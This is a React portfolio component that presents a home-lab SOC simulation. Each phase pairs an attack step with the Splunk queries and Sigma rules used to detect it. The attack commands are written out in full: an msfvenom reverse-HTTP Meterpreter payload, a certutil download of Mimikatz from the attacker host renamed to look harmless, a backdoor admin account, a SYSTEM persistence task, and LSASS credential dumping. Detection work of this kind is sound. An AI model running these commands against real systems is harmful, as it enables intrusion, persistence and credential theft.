import { useState } from "react";
import { motion } from "framer-motion";
import {
  ShieldAlert,
  Terminal,
  ExternalLink,
  Download,
  Github,
  FileText,
  Copy,
  Check,
  ChevronRight,
  ShieldCheck,
  Search,
  KeyRound,
  Network,
  UserCheck,
  Cpu,
} from "lucide-react";

interface SubStep {
  title: string;
  whatIDid: string;
  commandOrTool: string;
  howIDetectedIt: string;
  logSource: string;
  splunkQuery: string;
}

interface SimulationStep {
  id: string;
  stepNum: string;
  title: string;
  icon: any;
  overview: string;
  subSteps: SubStep[];
}

const simulationSteps: SimulationStep[] = [
  {
    id: "step-1",
    stepNum: "01",
    title: "Initial Access & C2",
    icon: Network,
    overview:
      "I staged a reverse HTTP Meterpreter payload on Kali Linux and executed it on the target Windows 10 endpoint to gain an initial foothold.",
    subSteps: [
      {
        title: "Executing the Staged Payload",
        whatIDid:
          "I generated an executable payload (FreeClude.exe) using Metasploit on Kali Linux. On the Windows 10 target machine, I launched the executable to initiate communication back to my listener.",
        commandOrTool: "msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.110.141 LPORT=80 -f exe > FreeClude.exe",
        howIDetectedIt:
          "I checked Sysmon Event ID 1 (Process Creation) in Splunk to confirm the execution of FreeClude.exe and identify its parent process and file hash.",
        logSource: "Sysmon Event ID 1 & Windows Security Event 4688",
        splunkQuery: 'index=windows EventCode=1 Image="*\\\\FreeClude.exe" | table _time host User Image ParentImage ProcessGuid',
      },
      {
        title: "Establishing Reverse HTTP C2",
        whatIDid:
          "Once FreeClude.exe ran, it initiated an outbound HTTP connection on port 80 back to Kali Linux, opening an interactive Meterpreter session.",
        commandOrTool: "msfconsole (exploit/multi/handler with windows/x64/meterpreter/reverse_http)",
        howIDetectedIt:
          "I monitored Sysmon Event ID 3 (Network Connection) in Splunk to spot the outbound TCP connection from FreeClude.exe to my Kali IP address on port 80.",
        logSource: "Sysmon Event ID 3 (Network Connection)",
        splunkQuery: 'index=windows EventCode=3 Image="*\\\\FreeClude.exe" DestinationPort=80 | table _time host Image DestinationIp DestinationPort',
      },
    ],
  },
  {
    id: "step-2",
    stepNum: "02",
    title: "System Discovery",
    icon: Search,
    overview:
      "Through the active Meterpreter session, I ran basic Windows commands to understand my current privileges and identify the operating system.",
    subSteps: [
      {
        title: "Checking User Identity & Privileges",
        whatIDid:
          "I opened a Windows command shell through Meterpreter and ran whoami to check what privileges the current session held and whether I was running with administrator rights.",
        commandOrTool: "whoami",
        howIDetectedIt:
          "In Splunk, I searched for instances where whoami.exe was spawned by cmd.exe as a child process of the initial payload.",
        logSource: "Sysmon Event ID 1 (Process Creation)",
        splunkQuery: 'index=windows EventCode=1 Image="*\\\\whoami.exe" ParentImage="*\\\\cmd.exe"',
      },
      {
        title: "Fingerprinting Host & OS Build",
        whatIDid:
          "I ran hostname and systeminfo within a 30-second window to quickly gather the computer name, OS build, architecture, and network configuration.",
        commandOrTool: "hostname && systeminfo",
        howIDetectedIt:
          "I tracked rapid burst process creation in Splunk, which is a classic indicator of automated or manual post-exploitation discovery.",
        logSource: "Sysmon Event ID 1 (Process Creation)",
        splunkQuery: 'index=windows EventCode=1 Image IN ("*\\\\hostname.exe", "*\\\\systeminfo.exe") | table _time host User CommandLine',
      },
    ],
  },
  {
    id: "step-3",
    stepNum: "03",
    title: "Persistence & Privilege Escalation",
    icon: UserCheck,
    overview:
      "To ensure I could re-enter the machine at any time, I created a local administrator user and scheduled an elevated background task.",
    subSteps: [
      {
        title: "Creating a Backdoor Admin Account",
        whatIDid:
          "I created a new local Windows account using net user and immediately added it to the local Administrators group for full system control.",
        commandOrTool: "net user saad P@ssw0rd123 /add && net localgroup Administrators saad /add",
        howIDetectedIt:
          "I investigated Windows Security audit logs in Splunk for Event 4720 (User Account Created) and Event 4732 (Member Added to Security Group).",
        logSource: "Windows Security Events 4720 & 4732",
        splunkQuery: 'index=windows (EventCode=4720 OR EventCode=4732) | table _time TargetUserName MemberName SubjectUserName GroupName',
      },
      {
        title: "Installing a SYSTEM Scheduled Task",
        whatIDid:
          "I registered a scheduled task using schtasks.exe that runs automatically at every user logon under the highest NT AUTHORITY\\SYSTEM privilege level, then deleted the temporary user.",
        commandOrTool: 'schtasks /create /tn "SystemHealth" /tr "C:\\Windows\\Temp\\FreeClude.exe" /sc onlogon /ru "SYSTEM"',
        howIDetectedIt:
          "I searched for Windows Event 4698 (A scheduled task was created) and parsed the XML payload to see which user account registered the task and under what principal it runs.",
        logSource: "Windows Security Event 4698 & Sysmon Event ID 1",
        splunkQuery: 'index=windows EventCode=4698 | xmlkv | search UserId="*SYSTEM*" | table _time host TaskName UserId',
      },
    ],
  },
  {
    id: "step-4",
    stepNum: "04",
    title: "Tool Transfer via certutil (LOLBIN)",
    icon: Cpu,
    overview:
      "Instead of using a web browser, I abused the legitimate Windows utility certutil.exe to download secondary offensive tools onto the victim.",
    subSteps: [
      {
        title: "Downloading Tools with certutil",
        whatIDid:
          "I used the native Windows certificate tool certutil.exe with the -urlcache parameter to pull mimikatz.exe from my Kali web server without triggering standard browser download prompts.",
        commandOrTool: "certutil -urlcache -split -f http://192.168.110.141/mimikatz.exe GetClaude.exe",
        howIDetectedIt:
          "In Splunk, I wrote a hunt query for certutil.exe executing with the -urlcache flag, which is a common Living-off-the-Land Binary (LOLBIN) abuse pattern.",
        logSource: "Sysmon Event ID 1 & Event ID 3",
        splunkQuery: 'index=windows EventCode=1 Image="*\\\\certutil.exe" CommandLine="*-urlcache*" | table _time host User CommandLine ProcessGuid',
      },
      {
        title: "Masquerading the Payload Name",
        whatIDid:
          "I renamed the downloaded Mimikatz binary to GetClaude.exe to disguise it as a legitimate AI utility and avoid immediate detection from file names.",
        commandOrTool: "Saved as: C:\\Users\\saad\\Downloads\\GetClaude.exe",
        howIDetectedIt:
          "I checked Sysmon Event ID 11 (File Create) in Splunk to detect whenever a new executable was written to disk by certutil.exe.",
        logSource: "Sysmon Event ID 11 (File Create)",
        splunkQuery: 'index=windows EventCode=11 TargetFilename="*\\\\GetClaude.exe" | table _time Image TargetFilename ProcessGuid',
      },
    ],
  },
  {
    id: "step-5",
    stepNum: "05",
    title: "Credential Access (Mimikatz)",
    icon: KeyRound,
    overview:
      "I ran the disguised Mimikatz binary and enabled debug privileges to prepare for credential harvesting against LSASS memory.",
    subSteps: [
      {
        title: "Enabling Debug Privileges",
        whatIDid:
          "I ran GetClaude.exe and entered privilege::debug. It returned Privilege 20 OK, which granted SeDebugPrivilege so the process could inspect sensitive Windows system processes.",
        commandOrTool: "GetClaude.exe -> privilege::debug",
        howIDetectedIt:
          "In Splunk, I created an alert searching for command-line arguments containing privilege::debug or known Mimikatz command keywords.",
        logSource: "Sysmon Event ID 1 (Process Creation)",
        splunkQuery: 'index=windows EventCode=1 (Image="*\\\\GetClaude.exe" OR CommandLine="*privilege::debug*") | table _time host User CommandLine IntegrityLevel',
      },
      {
        title: "Hunting for LSASS Memory Access",
        whatIDid:
          "Once debug privilege was confirmed, the process was positioned to interact with the Local Security Authority Subsystem Service (lsass.exe) memory.",
        commandOrTool: "sekurlsa::logonpasswords (Targeting lsass.exe)",
        howIDetectedIt:
          "I monitored Sysmon Event ID 10 (Process Access) in Splunk to flag any non-system process requesting read/query access handles to lsass.exe.",
        logSource: "Sysmon Event ID 10 (Process Access targeting lsass.exe)",
        splunkQuery: 'index=windows EventCode=10 TargetImage="*\\\\lsass.exe" GrantedAccess="*0x1010*" | table _time SourceImage TargetImage GrantedAccess',
      },
    ],
  },
  {
    id: "step-6",
    stepNum: "06",
    title: "Splunk SIEM Correlation & Defense",
    icon: ShieldCheck,
    overview:
      "In Splunk Enterprise, I correlated all collected logs across the timeline, authored Sigma detection rules, and converted them into production alerts.",
    subSteps: [
      {
        title: "Timeline Reconstruction via ProcessGuid",
        whatIDid:
          "Instead of viewing each event in isolation, I correlated the initial payload, the network C2 socket, and the child processes together using the unique Sysmon ProcessGuid.",
        commandOrTool: "Splunk SPL Transaction Searches & Correlation Matrix",
        howIDetectedIt:
          "I ran a transaction search grouping all events sharing the compromised ProcessGuid, producing a chronological reconstruction of the complete attack.",
        logSource: "Sysmon + Windows Security Audit Trail",
        splunkQuery: 'index=windows (host="Sh-Win10" OR host="SH-WIN10") | transaction ProcessGuid maxspan=2h | table _time host Image CommandLine EventCode',
      },
      {
        title: "Creating Sigma Detection Rules",
        whatIDid:
          "I translated the observed behaviors into formal Sigma rules (for scheduled task abuse and certutil ingress) and converted them into active Splunk SPL alert triggers.",
        commandOrTool: "SigmaHQ Rule Specification + Splunk Saved Searches",
        howIDetectedIt:
          "Configured automated alert searches in Splunk that trigger whenever high-risk command patterns (like certutil -urlcache or privilege::debug) occur in production.",
        logSource: "Splunk Alerting Engine",
        splunkQuery: 'index=windows EventCode=1 CommandLine IN ("*-urlcache*", "*privilege::debug*") | stats count by host User Image CommandLine',
      },
    ],
  },
];

export default function AttackTreeMap() {
  const [selectedStepId, setSelectedStepId] = useState<string>("step-1");
  const [selectedSubIdx, setSelectedSubIdx] = useState<number>(0);
  const [copiedQuery, setCopiedQuery] = useState<boolean>(false);

  const currentStep =
    simulationSteps.find((s) => s.id === selectedStepId) || simulationSteps[0];
  const currentSub =
    currentStep.subSteps[selectedSubIdx] || currentStep.subSteps[0];

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedQuery(true);
    setTimeout(() => setCopiedQuery(false), 2000);
  };

  return (
    <div className="bg-card/60 border border-primary/25 rounded-2xl p-5 md:p-7 relative overflow-hidden backdrop-blur-md shadow-[0_0_40px_rgba(255,107,53,0.06)]">
      {/* Decorative ambient glow */}
      <div className="absolute top-0 right-0 w-96 h-96 bg-primary/10 rounded-full blur-[120px] pointer-events-none -mr-20 -mt-20" />
      <div className="absolute bottom-0 left-0 w-96 h-96 bg-emerald-500/5 rounded-full blur-[120px] pointer-events-none -ml-20 -mb-20" />

      {/* Top Header & Details */}
      <div className="flex flex-col lg:flex-row lg:items-start justify-between gap-4 pb-6 border-b border-foreground/10 relative z-10">
        <div>
          <div className="flex items-center gap-2 mb-2.5 flex-wrap">
            <span className="text-[11px] font-bold uppercase tracking-wider text-primary bg-primary/10 px-2.5 py-0.5 rounded-md border border-primary/25 inline-flex items-center gap-1.5">
              <ShieldAlert size={13} />
              Hands-on SOC Simulation
            </span>
            <span className="text-xs font-semibold text-emerald-400 bg-emerald-400/10 px-2.5 py-0.5 rounded-full border border-emerald-400/20 inline-flex items-center gap-1">
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
              Simulation 1 Completed
            </span>
            <span className="text-xs text-muted-foreground bg-foreground/5 px-2.5 py-0.5 rounded-full border border-foreground/10">
              Splunk Enterprise 10.x · Sysmon · DFIR
            </span>
          </div>

          <h3 className="text-xl sm:text-2xl md:text-3xl font-serif font-bold text-foreground tracking-tight leading-snug">
            SOC Threat Detection Analysis Simulation: Endpoint Compromise & Log Correlation
          </h3>

          <p className="text-xs sm:text-sm text-primary/80 font-medium mt-1.5">
            Kali Linux (Attacker) <span className="text-muted-foreground/50">→</span> Windows 10 (Sysmon Target) <span className="text-muted-foreground/50">→</span> Windows 11 (Splunk SIEM)
          </p>
        </div>

        {/* Action Buttons */}
        <div className="flex items-center gap-2 sm:gap-2.5 flex-wrap shrink-0">
          <a
            href={`${import.meta.env.BASE_URL}reports/Splunk-SOC-Investigation-(1)-Report.pdf`}
            target="_blank"
            rel="noopener noreferrer"
            className="inline-flex items-center justify-center gap-1.5 text-xs sm:text-sm font-semibold text-primary-foreground bg-primary hover:bg-primary/90 px-4 py-2 rounded-full transition-all duration-200 shadow-md hover:shadow-primary/25"
          >
            <FileText size={15} />
            <span>View Report (PDF)</span>
            <ExternalLink size={12} />
          </a>

          <a
            href={`${import.meta.env.BASE_URL}reports/Splunk-SOC-Investigation-(1)-Report.docx`}
            download="Splunk-SOC-Investigation-(1)-Report.docx"
            className="inline-flex items-center justify-center gap-1.5 text-xs sm:text-sm font-semibold text-foreground bg-foreground/5 hover:bg-foreground/10 border border-foreground/15 px-3.5 py-2 rounded-full transition-all duration-200"
            title="Download Original Investigation Report (.docx)"
          >
            <Download size={15} />
            <span>Download (.docx)</span>
          </a>

          <a
            href="https://github.com/shii9/SOC_Simulation/tree/main/SOC_Investigation_Simulation_1"
            target="_blank"
            rel="noopener noreferrer"
            className="inline-flex items-center justify-center gap-1.5 text-xs sm:text-sm font-semibold text-foreground bg-foreground/5 hover:bg-foreground/10 border border-foreground/15 px-3.5 py-2 rounded-full transition-all duration-200"
          >
            <Github size={15} />
            <span>GitHub Repo</span>
            <ExternalLink size={12} />
          </a>
        </div>
      </div>

      {/* Narrative Summary */}
      <div className="py-4 text-xs sm:text-sm text-muted-foreground leading-relaxed relative z-10 border-b border-foreground/8">
        <p className="text-left sm:text-justify">
          In this hands-on lab, I simulated an end-to-end endpoint attack scenario and investigated the resulting telemetry
          in Splunk Enterprise. I walked through the entire intrusion process — executing a Meterpreter payload, performing
          system discovery, creating persistent admin backdoors, downloading secondary tools using Windows certutil, and
          testing credential access with Mimikatz. Using Sysmon and Windows Security event logs, I correlated the attack
          activities into a unified timeline and built actionable detection searches in Splunk.
        </p>
      </div>

      {/* Step-by-Step Interactive Map */}
      <div className="pt-6 relative z-10">
        <div className="flex items-center justify-between gap-3 mb-5">
          <div className="flex items-center gap-2">
            <div className="w-7 h-7 rounded-lg bg-primary/15 border border-primary/30 flex items-center justify-center text-primary">
              <Terminal size={14} />
            </div>
            <div>
              <span className="text-xs sm:text-sm font-bold text-foreground uppercase tracking-wider">
                Simulation Process & Investigation Map
              </span>
              <p className="text-[11px] text-muted-foreground hidden sm:block">
                Click any phase node to see what I did, the command used, and how I detected it in Splunk
              </p>
            </div>
          </div>
          <span className="text-[10px] font-mono text-primary bg-primary/10 border border-primary/20 px-2.5 py-0.5 rounded-full">
            Interactive Tree
          </span>
        </div>

        {/* Tree Layout: Left Tree Nodes & Right Explanation Pane */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5 items-start">
          {/* Left Column: Visual Tree Nodes with Curved Branch Lines */}
          <div className="lg:col-span-6 bg-background/50 border border-foreground/8 rounded-xl p-3.5 sm:p-4 space-y-2.5">
            {simulationSteps.map((step) => {
              const isSelected = selectedStepId === step.id;

              return (
                <div key={step.id} className="relative">
                  {/* Parent Phase Node */}
                  <button
                    type="button"
                    onClick={() => {
                      setSelectedStepId(step.id);
                      setSelectedSubIdx(0);
                    }}
                    className={`w-full flex items-center justify-between p-2.5 rounded-xl border text-left transition-all duration-200 group ${
                      isSelected
                        ? "bg-primary/15 border-primary/60 text-primary shadow-[0_0_15px_rgba(255,107,53,0.15)]"
                        : "bg-foreground/[0.02] border-foreground/8 hover:border-primary/30 hover:bg-foreground/[0.04]"
                    }`}
                  >
                    <div className="flex items-center gap-2.5 min-w-0">
                      {/* Node circle ring */}
                      <span
                        className={`w-4 h-4 rounded-full border-2 flex items-center justify-center shrink-0 transition-colors ${
                          isSelected
                            ? "border-primary bg-primary/30 shadow-[0_0_8px_rgba(255,107,53,0.6)]"
                            : "border-foreground/30 bg-background group-hover:border-primary/50"
                        }`}
                      >
                        <span
                          className={`w-1.5 h-1.5 rounded-full ${
                            isSelected ? "bg-primary" : "bg-transparent"
                          }`}
                        />
                      </span>

                      <div className="min-w-0">
                        <div className="flex items-center gap-2">
                          <span
                            className={`text-[10px] font-mono font-bold px-1.5 py-0.5 rounded ${
                              isSelected
                                ? "bg-primary text-primary-foreground"
                                : "bg-foreground/10 text-muted-foreground"
                            }`}
                          >
                            Step {step.stepNum}
                          </span>
                          <span className="text-xs font-bold truncate text-foreground group-hover:text-primary transition-colors">
                            {step.title}
                          </span>
                        </div>
                      </div>
                    </div>

                    <ChevronRight
                      size={14}
                      className={`shrink-0 transition-transform duration-200 ${
                        isSelected
                          ? "text-primary rotate-90"
                          : "text-muted-foreground/50 group-hover:text-primary"
                      }`}
                    />
                  </button>

                  {/* Child branches with smooth curved connector lines */}
                  {isSelected && (
                    <motion.div
                      initial={{ opacity: 0, height: 0 }}
                      animate={{ opacity: 1, height: "auto" }}
                      exit={{ opacity: 0, height: 0 }}
                      transition={{ duration: 0.2 }}
                      className="ml-5 pl-4 sm:pl-5 my-2 space-y-2 relative"
                    >
                      {/* Curved Connecting Path (just like mind map) */}
                      <svg
                        className="absolute left-0 top-0 h-full w-5 pointer-events-none stroke-primary/40 fill-none"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path d="M 0 0 C 0 18, 8 18, 16 18" strokeWidth="1.5" />
                        {step.subSteps.length > 1 && (
                          <path d="M 0 0 C 0 52, 8 52, 16 52" strokeWidth="1.5" />
                        )}
                        <line
                          x1="0"
                          y1="0"
                          x2="0"
                          y2={step.subSteps.length > 1 ? 52 : 18}
                          strokeWidth="1.5"
                        />
                      </svg>

                      {step.subSteps.map((sub, sIdx) => {
                        const isSubSelected = selectedSubIdx === sIdx;

                        return (
                          <button
                            key={sIdx}
                            type="button"
                            onClick={() => setSelectedSubIdx(sIdx)}
                            className={`w-full flex items-center justify-between p-2 rounded-lg border text-left text-xs transition-all duration-150 ${
                              isSubSelected
                                ? "bg-primary/20 border-primary/70 text-foreground font-semibold shadow-sm"
                                : "bg-foreground/[0.03] border-foreground/6 hover:border-primary/30 text-muted-foreground hover:text-foreground"
                            }`}
                          >
                            <div className="flex items-center gap-2 min-w-0">
                              {/* Sub-node circle ring */}
                              <span
                                className={`w-3 h-3 rounded-full border-2 flex items-center justify-center shrink-0 ${
                                  isSubSelected
                                    ? "border-primary bg-primary/40 shadow-[0_0_6px_rgba(255,107,53,0.5)]"
                                    : "border-foreground/30 bg-background"
                                }`}
                              >
                                <span
                                  className={`w-1 h-1 rounded-full ${
                                    isSubSelected ? "bg-primary" : "bg-transparent"
                                  }`}
                                />
                              </span>
                              <span className="truncate">{sub.title}</span>
                            </div>
                            <span className="text-[10px] text-primary/80 shrink-0 ml-1">
                              View Details
                            </span>
                          </button>
                        );
                      })}
                    </motion.div>
                  )}
                </div>
              );
            })}
          </div>

          {/* Right Column: Clear, Human Explanation of Each Phase */}
          <div className="lg:col-span-6 bg-background/70 border border-primary/25 rounded-xl p-4 sm:p-5 relative shadow-sm">
            <div className="flex items-center justify-between pb-3 mb-3 border-b border-foreground/10">
              <div className="flex items-center gap-2">
                <span className="text-xs font-mono font-bold text-primary bg-primary/10 border border-primary/25 px-2 py-0.5 rounded">
                  Step {currentStep.stepNum}
                </span>
                <span className="text-xs sm:text-sm font-bold text-foreground">
                  {currentSub.title}
                </span>
              </div>
              <span className="text-[11px] font-medium text-emerald-400 bg-emerald-400/10 px-2 py-0.5 rounded border border-emerald-400/20">
                {currentStep.title}
              </span>
            </div>

            <div className="space-y-3.5 text-xs leading-relaxed">
              {/* Section 1: What I Did */}
              <div>
                <span className="text-[11px] font-bold uppercase tracking-wider text-primary block mb-1">
                  1. What I Did in This Step
                </span>
                <p className="text-foreground/90 bg-foreground/[0.03] p-2.5 rounded-lg border border-foreground/6 leading-relaxed">
                  {currentSub.whatIDid}
                </p>
              </div>

              {/* Section 2: Command / Tool Executed */}
              <div>
                <span className="text-[11px] font-bold uppercase tracking-wider text-foreground/80 block mb-1">
                  2. Command & Tool Executed
                </span>
                <code className="block font-mono text-[11px] text-primary/95 bg-black/50 p-2.5 rounded-lg border border-foreground/10 overflow-x-auto whitespace-pre-wrap leading-relaxed">
                  {currentSub.commandOrTool}
                </code>
              </div>

              {/* Section 3: How I Detected It */}
              <div>
                <span className="text-[11px] font-bold uppercase tracking-wider text-emerald-400 block mb-1">
                  3. How I Detected & Investigated It
                </span>
                <p className="text-muted-foreground bg-foreground/[0.02] p-2.5 rounded-lg border border-foreground/6 leading-relaxed">
                  {currentSub.howIDetectedIt}
                </p>
                <div className="mt-1.5 flex items-center gap-1.5 text-[11px]">
                  <span className="font-semibold text-foreground/70">Evidence Source:</span>
                  <span className="font-mono text-emerald-400 bg-emerald-400/10 px-1.5 py-0.5 rounded border border-emerald-400/20">
                    {currentSub.logSource}
                  </span>
                </div>
              </div>

              {/* Section 4: Splunk Query */}
              <div className="pt-1">
                <div className="flex items-center justify-between mb-1.5">
                  <span className="text-[10px] font-semibold text-primary uppercase tracking-wider flex items-center gap-1.5">
                    <Terminal size={12} />
                    Splunk Search Query
                  </span>
                  <button
                    type="button"
                    onClick={() => handleCopy(currentSub.splunkQuery)}
                    className="text-[10px] text-muted-foreground hover:text-primary transition-colors flex items-center gap-1 px-2 py-0.5 rounded bg-foreground/5 hover:bg-foreground/10 border border-foreground/10"
                  >
                    {copiedQuery ? (
                      <>
                        <Check size={11} className="text-emerald-400" />
                        <span className="text-emerald-400 font-medium">Copied</span>
                      </>
                    ) : (
                      <>
                        <Copy size={11} />
                        <span>Copy Query</span>
                      </>
                    )}
                  </button>
                </div>
                <code className="block font-mono text-[11px] text-primary/90 bg-black/60 p-2.5 rounded-lg border border-primary/20 overflow-x-auto whitespace-pre-wrap leading-relaxed">
                  {currentSub.splunkQuery}
                </code>
              </div>
            </div>

            {/* Bottom info */}
            <div className="mt-4 pt-3 border-t border-foreground/8 text-[11px] text-muted-foreground flex items-center justify-between">
              <span>Phase {currentStep.stepNum} of 06</span>
              <span className="text-primary font-medium">Splunk Enterprise SIEM</span>
            </div>
          </div>
        </div>

        {/* Tags */}
        <div className="flex flex-wrap items-center gap-2 pt-6 mt-6 border-t border-foreground/8">
          {[
            "Splunk Enterprise",
            "Sysmon Logs",
            "Windows Security Events",
            "Reverse HTTP C2",
            "certutil LOLBIN",
            "Mimikatz",
            "Persistence Setup",
            "SIEM Threat Hunting",
          ].map((tag) => (
            <span
              key={tag}
              className="text-xs font-medium text-primary/80 bg-primary/8 px-3 py-1 rounded-full border border-primary/15"
            >
              {tag}
            </span>
          ))}
        </div>
      </div>
    </div>
  );
}
